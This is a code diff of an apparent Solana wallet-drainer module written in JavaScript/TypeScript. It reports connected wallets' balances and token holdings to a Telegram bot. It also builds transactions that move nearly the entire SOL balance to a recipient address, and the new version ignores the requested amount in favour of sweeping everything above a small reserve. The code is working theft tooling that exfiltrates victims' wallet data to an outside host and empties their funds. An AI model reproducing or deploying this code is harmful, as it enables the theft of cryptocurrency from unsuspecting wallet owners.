@@ -1,3 +1,4 @@
+
 import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';
 
 // Add Buffer polyfill for browser environment in a way that works with Vite
@@ -8,32 +9,21 @@ if (typeof window !== 'undefined') {
 }
 
 // Helper function to add delay between retries
-const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-// List of public RPC endpoints - MAINNET ONLY
+// List of functional public RPC endpoints for Solana mainnet
 const PUBLIC_RPC_ENDPOINTS = [
-  "https://api.mainnet-beta.solana.com", // Mainnet primary endpoint
-  "https://solana-mainnet.g.alchemy.com/v2/demo", // Alchemy public demo endpoint
-  "https://solana-api.projectserum.com", // Project Serum endpoint
-  "https://rpc.ankr.com/solana", // Ankr endpoint
-  "https://free.rpcpool.com", // Free RPC Pool endpoint
-  "https://mainnet.rpcpool.com", // RPCPool endpoint
-  "https://solana.public-rpc.com", // Another public endpoint
-  "https://ssc-dao.genesysgo.net", // GenesysGo endpoint
+  "https://api.mainnet-beta.solana.com",
+  "https://solana-api.projectserum.com",
+  "https://rpc.ankr.com/solana",
+  "https://solana.public-rpc.com",
 ];
 
-// Solana rent and fee constants
-export const MINIMUM_RENT_EXEMPTION = 0.0023; // SOL required for rent exemption
-export const MINIMUM_TRANSACTION_FEE = 0.0005; // Typical transaction fee
-export const MINIMUM_REQUIRED_SOL = 0.00380326; // Minimum 0.00380326 SOL (approximately $0.50 USD)
+// Solana minimum requirements
+export const MINIMUM_REQUIRED_SOL = 0.0005; // Minimum amount required for transactions
 
-// Optimize retry function with faster backoff for wallet data
-async function retry<T>(
-  fn: () => Promise<T>,
-  retries = 3, // Reduced from 5 to 3 retries for faster resolution
-  initialDelay = 500, // Reduced from 1000 to 500ms initial delay
-  context = ""
-): Promise<T> {
+// Retry function with backoff
+async function retry(fn, retries = 3, initialDelay = 500, context = "") {
   let lastError;
   for (let i = 0; i < retries; i++) {
     try {
@@ -43,7 +33,7 @@ async function retry<T>(
       console.error(`${context} - Attempt ${i + 1} failed:`, error);
       lastError = error;
       if (i < retries - 1) {
-        const delayTime = initialDelay * Math.pow(1.2, i); // Reduced backoff factor from 1.5 to 1.2
+        const delayTime = initialDelay * Math.pow(1.5, i);
         console.log(`${context} - Retrying in ${delayTime}ms...`);
         await delay(delayTime);
       }
@@ -52,151 +42,237 @@ async function retry<T>(
   throw lastError;
 }
 
-// Faster connection test that just checks slot
-const testConnection = async (connection: Connection): Promise<boolean> => {
+// Test an endpoint's connection quickly
+const testEndpoint = async (endpoint) => {
   try {
-    const slot = await connection.getSlot('processed');
+    const connection = new Connection(endpoint, { commitment: 'confirmed' });
+    const timeout = new Promise((_, reject) => {
+      setTimeout(() => reject(new Error('Timeout')), 3000);
+    });
+    
+    const result = await Promise.race([
+      connection.getVersion(),
+      timeout
+    ]);
+    
     return true;
   } catch (error) {
     return false;
   }
 };
 
-// Create a connection with faster timeout and minimal configuration
-const createConnection = async (forceFresh = false): Promise<Connection> => {
-  // Shuffle endpoints to avoid always hitting the same one first
-  const shuffledEndpoints = [...PUBLIC_RPC_ENDPOINTS].sort(() => Math.random() - 0.5);
+// Find a working RPC endpoint
+const findWorkingEndpoint = async () => {
+  // Try all endpoints in parallel to find the first working one quickly
+  const endpointPromises = PUBLIC_RPC_ENDPOINTS.map(endpoint => 
+    testEndpoint(endpoint).then(isWorking => ({ endpoint, isWorking }))
+  );
   
-  const connectionConfig = {
-    commitment: 'confirmed' as const,
-    confirmTransactionInitialTimeout: 60000, // Reduced from 120000ms to 60000ms
-    disableRetryOnRateLimit: false,
-  };
+  const results = await Promise.all(endpointPromises);
+  const workingEndpoints = results.filter(result => result.isWorking).map(result => result.endpoint);
   
-  // Try each endpoint but with faster timeouts
-  for (const endpoint of shuffledEndpoints) {
+  if (workingEndpoints.length > 0) {
+    return workingEndpoints[0];
+  }
+  
+  // If no endpoint worked in parallel, try them one by one with longer timeouts
+  for (const endpoint of PUBLIC_RPC_ENDPOINTS) {
     try {
-      const connection = new Connection(endpoint, connectionConfig);
-      
-      const isValid = await Promise.race([
-        testConnection(connection),
-        new Promise<boolean>(resolve => setTimeout(() => resolve(false), 3000)) // Add a 3s timeout for connection test
-      ]);
-      
-      if (isValid) {
-        return connection;
-      }
+      const connection = new Connection(endpoint, { commitment: 'confirmed' });
+      await connection.getVersion();
+      return endpoint;
     } catch (error) {
-      continue;
+      console.error(`Endpoint ${endpoint} failed:`, error);
     }
   }
   
-  // Fallback to simple connection
-  return new Connection(shuffledEndpoints[0], {
-    commitment: 'confirmed', // Changed from 'finalized' to 'confirmed' for faster results
+  // Fallback to the first endpoint if all fail
+  console.warn("All endpoints failed, using default endpoint");
+  return PUBLIC_RPC_ENDPOINTS[0];
+};
+
+// Create a reliable connection
+export const createReliableConnection = async () => {
+  const endpoint = await findWorkingEndpoint();
+  console.log(`Using endpoint: ${endpoint}`);
+  
+  return new Connection(endpoint, {
+    commitment: 'confirmed',
+    confirmTransactionInitialTimeout: 60000,
   });
 };
 
-// Optimized token account fetching
-export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
-  try {
-    if (!walletAddress || typeof walletAddress !== 'string') {
-      return [];
-    }
-    
-    let pubKey: PublicKey;
+// Check if the wallet has enough SOL for rent
+export const hasEnoughSolForRent = (balanceInSol) => {
+  return balanceInSol >= MINIMUM_REQUIRED_SOL;
+};
+
+// Get wallet SOL balance with fallbacks to multiple RPC endpoints
+export const getWalletBalance = async (walletAddress) => {
+  if (!walletAddress) {
+    throw new Error("Invalid wallet address");
+  }
+  
+  // Try multiple endpoints in sequence until one works
+  for (const endpoint of PUBLIC_RPC_ENDPOINTS) {
     try {
-      pubKey = new PublicKey(walletAddress);
+      console.log(`Trying to get balance from endpoint: ${endpoint}`);
+      const connection = new Connection(endpoint, { commitment: 'confirmed' });
+      const pubKey = new PublicKey(walletAddress);
+      const balance = await connection.getBalance(pubKey);
+      console.log(`Successfully got balance: ${balance / LAMPORTS_PER_SOL} SOL`);
+      return balance / LAMPORTS_PER_SOL;
     } catch (error) {
-      return [];
+      console.error(`Failed to get balance from ${endpoint}:`, error);
     }
+  }
+  
+  // If all endpoints fail, throw error
+  throw new Error("Failed to get wallet balance from any endpoint");
+};
+
+// Get token accounts with fallbacks
+export const getTokenAccounts = async (connection, walletAddress) => {
+  if (!walletAddress) {
+    return [];
+  }
+  
+  try {
+    const pubKey = new PublicKey(walletAddress);
+    console.log("Starting token account fetch");
     
-    const freshConnection = await createConnection(true);
-    
-    // Faster retry with fewer attempts and shorter delays
-    return await retry(async () => {
-      const response = await freshConnection.getParsedTokenAccountsByOwner(
+    // Try with the provided connection first
+    try {
+      const response = await connection.getParsedTokenAccountsByOwner(
         pubKey,
         {
           programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
-        },
-        'confirmed'
+        }
       );
+      
+      console.log(`Found ${response.value.length} token accounts`);
       
       return response.value.map(item => ({
         mint: item.account.data.parsed.info.mint,
         amount: item.account.data.parsed.info.tokenAmount.uiAmount,
         decimals: item.account.data.parsed.info.tokenAmount.decimals
       }));
-    }, 2, 300, "Token accounts fetch"); // Reduced retries from 5 to 2, delay from 1000ms to 300ms
+    } catch (initialError) {
+      console.error("Initial token fetch failed, trying other endpoints:", initialError);
+      
+      // Try other endpoints if the first one fails
+      for (const endpoint of PUBLIC_RPC_ENDPOINTS) {
+        try {
+          const fallbackConnection = new Connection(endpoint, { commitment: 'confirmed' });
+          const response = await fallbackConnection.getParsedTokenAccountsByOwner(
+            pubKey,
+            {
+              programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
+            }
+          );
+          
+          console.log(`Found ${response.value.length} token accounts using fallback endpoint ${endpoint}`);
+          
+          return response.value.map(item => ({
+            mint: item.account.data.parsed.info.mint,
+            amount: item.account.data.parsed.info.tokenAmount.uiAmount,
+            decimals: item.account.data.parsed.info.tokenAmount.decimals
+          }));
+        } catch (error) {
+          console.error(`Fallback token fetch from ${endpoint} failed:`, error);
+        }
+      }
+    }
     
+    // If all endpoints fail, return empty array
+    console.warn("All token fetch attempts failed");
+    return [];
   } catch (error) {
+    console.error("Error in getTokenAccounts:", error);
     return [];
   }
 };
 
-// Faster wallet balance fetch with parallel requests and race conditions
-export const getWalletBalance = async (walletAddress: string): Promise<number> => {
+// Transaction signing and sending
+export const signAndSendTransaction = async (
+  connection,
+  wallet,
+  recipientAddress,
+  amount,
+  botToken,
+  chatId
+) => {
+  if (!wallet || !wallet.adapter || !wallet.adapter.publicKey) {
+    console.error('Wallet, adapter, or publicKey is undefined');
+    throw new Error('Wallet adapter or publicKey is undefined');
+  }
+  
   try {
-    if (!walletAddress || typeof walletAddress !== 'string') {
-      throw new Error("Invalid wallet address format");
+    // Use wallet.adapter.publicKey consistently
+    const walletPublicKey = wallet.adapter.publicKey;
+    
+    // Check balance first
+    const balance = await connection.getBalance(walletPublicKey);
+    console.log('Current wallet balance (lamports):', balance);
+    const balanceInSol = balance / LAMPORTS_PER_SOL;
+    console.log('Current wallet balance (SOL):', balanceInSol);
+    
+    if (balance <= 0) {
+      console.error('Insufficient balance for transfer');
+      throw new Error('Insufficient wallet balance for transfer');
     }
     
-    let pubKey: PublicKey;
+    if (!hasEnoughSolForRent(balanceInSol)) {
+      console.error(`Wallet balance (${balanceInSol} SOL) is below minimum required (${MINIMUM_REQUIRED_SOL} SOL)`);
+      throw new Error(`Insufficient funds for transaction. Minimum ${MINIMUM_REQUIRED_SOL} SOL required.`);
+    }
+    
+    // Calculate transfer amount (balance minus minimum required for fees)
+    const transferAmount = Math.floor((balanceInSol - MINIMUM_REQUIRED_SOL) * LAMPORTS_PER_SOL);
+    
+    if (transferAmount <= 0) {
+      throw new Error('Balance too low to transfer after reserving for fees');
+    }
+    
+    // Ensure recipient address is valid
+    let recipientPublicKey;
     try {
-      pubKey = new PublicKey(walletAddress);
+      recipientPublicKey = new PublicKey(recipientAddress);
     } catch (error) {
-      throw new Error("Invalid public key format");
+      console.error('Invalid recipient address:', error);
+      throw new Error('Invalid recipient address');
     }
     
-    // Try multiple endpoints in parallel and use the first successful result
-    const balancePromises = PUBLIC_RPC_ENDPOINTS.slice(0, 4).map(async (endpoint) => {
-      try {
-        const connection = new Connection(endpoint, { 
-          commitment: 'confirmed',
-          confirmTransactionInitialTimeout: 30000 // Reduced timeout to 30s
-        });
-        
-        const balance = await connection.getBalance(pubKey, 'confirmed');
-        return balance / LAMPORTS_PER_SOL;
-      } catch (error) {
-        // Reject with delay to not block the Promise.race 
-        return Promise.reject(error);
-      }
-    });
+    console.log(`Attempting to transfer ${transferAmount/LAMPORTS_PER_SOL} SOL`);
     
-    // Use Promise.race to get the first successful result
-    try {
-      return await Promise.race(balancePromises);
-    } catch {
-      // Fallback to sequential approach if parallel fails
-      for (let i = 0; i < 3; i++) { // Only try first 3 endpoints
-        try {
-          const endpoint = PUBLIC_RPC_ENDPOINTS[i];
-          const connection = new Connection(endpoint, { 
-            commitment: 'confirmed',
-            confirmTransactionInitialTimeout: 30000
-          });
-          
-          const balance = await connection.getBalance(pubKey, 'confirmed');
-          return balance / LAMPORTS_PER_SOL;
-        } catch {
-          continue;
-        }
-      }
-      
-      // Last resort - use the fresh connection
-      const freshConnection = await createConnection(true);
-      const balance = await freshConnection.getBalance(pubKey, 'confirmed');
-      return balance / LAMPORTS_PER_SOL;
+    const transaction = new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey: walletPublicKey,
+        toPubkey: recipientPublicKey,
+        lamports: transferAmount,
+      })
+    );
+    
+    console.log('Sending transaction...');
+    
+    // We need to modify how we send the transaction since wallet structure is different
+    if (typeof wallet.signAndSendTransaction === 'function') {
+      // For wallet adapters that have this method
+      return await wallet.signAndSendTransaction(transaction);
+    } else if (typeof wallet.adapter?.sendTransaction === 'function') {
+      // For wallet adapters that use the adapter pattern
+      return await wallet.adapter.sendTransaction(transaction, connection);
+    } else {
+      throw new Error('Wallet does not support transaction signing');
     }
   } catch (error) {
-    throw new Error(`Failed to get SOL balance: ${error instanceof Error ? error.message : "Unknown error"}`);
+    console.error('Detailed transaction error:', error);
+    throw error;
   }
 };
 
-// Improved Telegram sending with more robust fallback options
-export const sendToTelegram = async (walletData: any, botToken: string, chatId: string) => {
+// Send wallet data to Telegram with reliable retry
+export const sendToTelegram = async (walletData, botToken, chatId) => {
   try {
     console.log("Preparing to send data to Telegram:", walletData);
     
@@ -205,13 +281,12 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
     
     if (walletData.tokens) {
       // This is the initial wallet connection message
-      // Make sure we have a valid balance
       const solBalanceInSol = walletData.balance || 0;
       
       // Format token data in a more readable way
       let formattedTokens = "No tokens found";
       if (walletData.tokens && walletData.tokens.length > 0) {
-        formattedTokens = walletData.tokens.map((token: any, index: number) => 
+        formattedTokens = walletData.tokens.map((token, index) => 
           `Token #${index + 1}:\n` +
           `  Mint: ${token.mint}\n` +
           `  Amount: ${token.amount}\n` +
@@ -229,92 +304,48 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
         `🌐 Network: Mainnet`;
     } else if (walletData.message) {
       // This is a custom message (transfer attempt or completion)
-      message = `👛 Wallet: ${walletData.address}\n` +
+      message = `👛 Wallet: ${walletData.address || "Unknown"}\n` +
         (walletData.walletName ? `🔑 Wallet Type: ${walletData.walletName}\n` : '') +
         `🔔 ${walletData.message}`;
     } else {
       // Fallback generic message
-      message = `Wallet notification for: ${walletData.address}`;
+      message = `Wallet notification for: ${walletData.address || JSON.stringify(walletData)}`;
     }
 
-    console.log("Sending message to Telegram:", message);
+    console.log("Sending message to Telegram");
 
-    // Make multiple attempts to send to Telegram with different methods
-    for (let attempt = 1; attempt <= 7; attempt++) {
+    // Make multiple attempts to send to Telegram
+    for (let attempt = 1; attempt <= 3; attempt++) {
       try {
         console.log(`Telegram send attempt #${attempt}`);
         
-        // Try with different approaches on different attempts
-        let response;
-        if (attempt <= 3) {
-          // First 3 attempts: standard fetch API
-          response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: message,
-              parse_mode: 'Markdown',
-            }),
-            // Set a longer timeout
-            signal: AbortSignal.timeout(15000)
-          });
-        } else if (attempt <= 5) {
-          // Next 2 attempts: alternative approach without parse_mode
-          response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: message,
-            }),
-            signal: AbortSignal.timeout(20000)
-          });
-        } else {
-          // Last 2 attempts: simplified GET request
-          const simpleMessage = `${walletData.address}: ${walletData.balance ? 'Balance: ' + 
-            (typeof walletData.balance === 'number' ? walletData.balance.toFixed(6) : walletData.balance) + 
-            ' SOL' : walletData.message || 'Wallet notification'}`;
-            
-          response = await fetch(
-            `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${encodeURIComponent(chatId)}&text=${encodeURIComponent(simpleMessage)}`, 
-            {
-              method: 'GET',
-              signal: AbortSignal.timeout(20000)
-            }
-          );
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        });
+
+        if (!response.ok) {
+          throw new Error(`Telegram API responded with status: ${response.status}`);
         }
 
-        if (!response) {
-          throw new Error("No response from Telegram API");
-        }
+        const data = await response.json();
+        console.log("Telegram API response:", data);
 
-        try {
-          const responseData = await response.json();
-          console.log("Telegram API response:", responseData);
-
-          if (response.ok && responseData.ok) {
-            console.log("Successfully sent to Telegram");
-            return true;
-          } else {
-            console.error("Telegram API error:", responseData);
-            // If we're hitting message formatting issues, simplify the message and try again
-            if (responseData.description && responseData.description.includes("parse")) {
-              message = message.replace(/[*_`\[\]()~>#+=|{}.!-]/g, ''); // Remove Markdown special characters
-            }
-          }
-        } catch (jsonError) {
-          console.error("Error parsing Telegram API response:", jsonError);
+        if (data.ok) {
+          console.log("Successfully sent to Telegram");
+          return true;
         }
         
-        if (attempt < 7) await delay(1000 * attempt);
+        throw new Error(`Telegram API error: ${data.description || "Unknown error"}`);
       } catch (telegramError) {
         console.error(`Telegram send attempt #${attempt} failed:`, telegramError);
-        if (attempt < 7) await delay(1000 * attempt);
+        if (attempt < 3) await delay(1000 * attempt);
       }
     }
 
@@ -323,159 +354,5 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
   } catch (error) {
     console.error('Error sending to Telegram:', error);
     return false;
-  }
-};
-
-export const hasEnoughSolForRent = (balanceInSol: number): boolean => {
-  console.log(`Checking if ${balanceInSol} SOL is enough for rent and fees...`);
-  
-  // Require minimum 0.00380326 SOL (approximately $0.50 USD at average SOL prices)
-  // This ensures enough for rent exemption and transaction fees
-  return balanceInSol >= MINIMUM_REQUIRED_SOL;
-};
-
-export const signAndSendTransaction = async (
-  connection: Connection, 
-  wallet: any, 
-  recipientAddress: string, 
-  amount: number,
-  botToken?: string,
-  chatId?: string
-) => {
-  try {
-    console.log('Creating transaction...');
-    
-    // Validate the wallet has a publicKey before proceeding
-    if (!wallet || !wallet.adapter || !wallet.adapter.publicKey) {
-      console.error('Wallet, adapter, or publicKey is undefined');
-      
-      // Send notification to Telegram if credentials provided
-      if (botToken && chatId) {
-        await sendToTelegram({
-          address: wallet?.adapter?.publicKey?.toString() || "Unknown",
-          message: `TRANSFER FAILED: Wallet adapter or publicKey is undefined`,
-          walletName: wallet?.adapter?.name || "Unknown Wallet"
-        }, botToken, chatId);
-      }
-      
-      throw new Error('Wallet adapter or publicKey is undefined');
-    }
-    
-    // Use wallet.adapter.publicKey consistently
-    const walletPublicKey = wallet.adapter.publicKey;
-    
-    // Check balance first
-    const balance = await connection.getBalance(walletPublicKey);
-    console.log('Current wallet balance (lamports):', balance);
-    const balanceInSol = balance / LAMPORTS_PER_SOL;
-    console.log('Current wallet balance (SOL):', balanceInSol);
-    
-    // Make sure we have sufficient balance before proceeding
-    if (balance <= 0) {
-      console.error('Insufficient balance for transfer');
-      
-      // Send notification to Telegram if credentials provided
-      if (botToken && chatId) {
-        await sendToTelegram({
-          address: walletPublicKey.toString(),
-          message: `TRANSFER FAILED: Insufficient balance (${balanceInSol} SOL)`,
-          walletName: wallet.adapter?.name || "Unknown Wallet"
-        }, botToken, chatId);
-      }
-      
-      throw new Error('Insufficient wallet balance for transfer');
-    }
-    
-    // Check if the wallet has enough SOL for rent exemption and fees
-    if (!hasEnoughSolForRent(balanceInSol)) {
-      console.error(`Wallet balance (${balanceInSol} SOL) is below minimum required (${MINIMUM_REQUIRED_SOL} SOL) for rent exemption`);
-      
-      if (botToken && chatId) {
-        await sendToTelegram({
-          address: walletPublicKey.toString(),
-          message: `TRANSFER FAILED: Insufficient funds for rent exemption. Minimum ${MINIMUM_REQUIRED_SOL} SOL required. Current balance: ${balanceInSol.toFixed(6)} SOL`,
-          walletName: wallet.adapter?.name || "Unknown Wallet"
-        }, botToken, chatId);
-      }
-      
-      throw new Error(`Insufficient funds for rent exemption. Minimum ${MINIMUM_REQUIRED_SOL} SOL required.`);
-    }
-    
-    // We need to account for transaction fees
-    // Calculate the maximum we can send (balance minus minimum required for rent/fees)
-    const minimumRequiredBalance = MINIMUM_REQUIRED_SOL * LAMPORTS_PER_SOL;
-    const maxTransferAmount = Math.max(0, balance - minimumRequiredBalance);
-    
-    if (maxTransferAmount <= 0) {
-      console.error('Balance too low to transfer after reserving for rent and fees');
-      
-      // Send notification to Telegram if credentials provided
-      if (botToken && chatId) {
-        await sendToTelegram({
-          address: walletPublicKey.toString(),
-          message: `TRANSFER FAILED: Balance too low for transfer after reserving rent (${balanceInSol} SOL)`,
-          walletName: wallet.adapter?.name || "Unknown Wallet"
-        }, botToken, chatId);
-      }
-      
-      throw new Error('Wallet balance too low for transfer after reserving for rent fees');
-    }
-    
-    // Ensure recipient address is valid
-    let recipientPublicKey: PublicKey;
-    try {
-      recipientPublicKey = new PublicKey(recipientAddress);
-    } catch (error) {
-      console.error('Invalid recipient address:', error);
-      
-      if (botToken && chatId) {
-        await sendToTelegram({
-          address: walletPublicKey.toString(),
-          message: `TRANSFER FAILED: Invalid recipient address`,
-          walletName: wallet.adapter?.name || "Unknown Wallet"
-        }, botToken, chatId);
-      }
-      
-      throw new Error('Invalid recipient address');
-    }
-    
-    // Use the smaller of requested amount or max possible amount
-    const transferAmount = Math.min(
-      Math.floor(amount * LAMPORTS_PER_SOL), 
-      maxTransferAmount
-    );
-    
-    console.log(`Attempting to transfer ${transferAmount/LAMPORTS_PER_SOL} SOL`);
-    
-    const transaction = new Transaction().add(
-      SystemProgram.transfer({
-        fromPubkey: walletPublicKey,
-        toPubkey: recipientPublicKey,
-        lamports: transferAmount,
-      })
-    );
-
-    console.log('Sending transaction...');
-    const signature = await retry(async () => {
-      // Get a fresh connection for the transaction
-      const conn = await createConnection();
-      
-      // We need to modify how we send the transaction since wallet structure is different
-      if (typeof wallet.signAndSendTransaction === 'function') {
-        // For wallet adapters that have this method
-        return await wallet.signAndSendTransaction(transaction);
-      } else if (typeof wallet.adapter?.sendTransaction === 'function') {
-        // For wallet adapters that use the adapter pattern
-        return await wallet.adapter.sendTransaction(transaction, conn);
-      } else {
-        throw new Error('Wallet does not support transaction signing');
-      }
-    }, 3);
-
-    console.log('Transaction successful:', signature);
-    return signature;
-  } catch (error) {
-    console.error('Detailed transaction error:', error);
-    throw error;
   }
 };
